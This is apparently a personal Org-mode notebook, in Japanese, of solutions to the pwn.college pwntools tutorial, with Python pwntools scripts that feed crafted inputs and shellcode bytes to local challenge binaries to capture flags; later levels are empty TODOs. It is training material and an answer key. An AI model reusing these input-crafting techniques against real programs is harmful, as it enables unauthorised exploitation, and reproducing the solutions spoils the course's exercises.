#+STARTUP: overview

[[https://pwn.college/pwntools~9b09c9dc/pwntools/][Pwntools(pwn.college)]]

* DONE Level 0.0
CLOSED: [2026-03-22 日 19:16]
:LOGBOOK:
- CLOSING NOTE [2026-03-22 日 19:16]
:END:
#+begin_quote
このレベルはチュートリアルで比較的簡単です。
#+end_quote

** Exploit
~$~ が出てきたところでエンタキーを押すとフラグが得られる。

#+begin_src python
from pwn import *

# Set architecture, os and log level
context(arch="amd64", os="linux", log_level="info")

# Load the ELF file and execute it as a new process.
challenge_path = "/challenge/pwntools-tutorials-level0.0"
p = process(challenge_path)

payload = b'pokemon'
# Send the payload after the string ":)\n###\n" is found.
p.sendafter(":)\n###\n", payload)

# Receive flag from the process

p.interactive()

# flag = p.recvline()
# print(f"flag is: {flag}")
#+end_src
* DONE Level 1.0
CLOSED: [2026-03-25 水 02:48]
:LOGBOOK:
- CLOSING NOTE [2026-03-25 水 02:48] \\
  # 1 day streak...
:END:
#+begin_quote
このチャレンジでは bypass_me 関数を読むことと、チャレンジを完了するために pwntools を使用する必要があります。
#+end_quote
** 実験
~0xdeadbeef~ は下位バイトから順にメモリに配置される。
なので、 ~buf~ にはそのような形式になる値を渡す。

#+HEADER: :var buf="\xef\xbe\xad\xde"
#+begin_src C :includes '(<stdio.h> <string.h>) :results output :exports both
unsigned int magic = 0xdeadbeef;
if (!strncmp(buf, (char *)&magic, 4)) {
    puts("True");
}
else {
    puts("False");
}
#+end_src

#+RESULTS:
: True

** Exploit
~$~ が出てきたところでエンタキーを押すとフラグが得られる。

#+begin_src python
from pwn import *

# Set architecture, os and log level
context(arch="amd64", os="linux", log_level="info")

# Load the ELF file and execute it as a new process.
challenge_path = "/challenge/pwntools-tutorials-level1.0"
p = process(challenge_path)

payload = p32(0xdeadbeef)
# Send the payload after the string ":)\n###\n" is found.
p.sendafter(":)\n###\n", payload)

# Receive flag from the process

# p.recvuntil(b"flag is: ")

# flag = p.recvline()
# print(f"flag is: {flag}")

p.interactive()
#+end_src
* TODO Level 1.1
蝶のポケモン

1. ~buf[0] ==== 'p' && buf[1] == 0x15~
2. ~num == 0x75bcd15~
3. 

#+begin_src C
if (buf[0] != 'p' || buf[1] != 0x15) {
    flag = 0;
    goto out;
}

memcpy(&num, buf + 2, 4);
if (num != 123456789) {
    flag = 0;
    goto out;
}

if (strncmp(buf + 6, "Bypass Me:)", 11)) {
    flag = 0;
    goto out;
}
#+end_src


#+begin_src python :results output :exports both
print(hex(123456789))
#+end_src

#+RESULTS:
: 0x75bcd15

~p32(0x75bcd15)~

** Exploit
#+begin_src python
from pwn import *

# Set architecture, os and log level
context(arch="amd64", os="linux", log_level="info")

# Load the ELF file and execute it as a new process.
challenge_path = "/challenge/pwntools-tutorials-level1.1"
p = process(challenge_path)

payload = b'p' + b'\x15' + p32(0x75bcd15) + b"Bypass Me:)"

# Send the payload after the string ":)\n###\n" is found.
p.sendafter(":)\n###\n", payload)

# Receive flag from the process

p.interactive()
#+end_src
* DONE Level 2.0
CLOSED: [2026-03-27 金 09:12]
:LOGBOOK:
- CLOSING NOTE [2026-03-27 金 09:12] \\
  # 1 day streak...
:END:

~mov~ によって ~rax~ に値を代入する。

#+begin_src python
from pwn import *

def print_lines(io):
    info("Printing io received lines")
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

# Set architecture, os and log level
context(arch="amd64", os="linux", log_level="info")

# Load the ELF file and execute it as a new process.
challenge_path = "/challenge/pwntools-tutorials-level2.0"

p = process(challenge_path)

# Send the payload after the string "(up to 0x1000 bytes): \n" is found.
p.sendafter("Please give me your assembly in bytes", asm("mov rax, 0x12345678"))

print_lines(p)
#+end_src
* TODO Level 2.1
* TODO Level 2.2
* TODO Level 2.3
* TODO Level 2.4
* TODO Level 2.5
* TODO Level 2.6
* TODO Level 3.0
* TODO Level 4.0
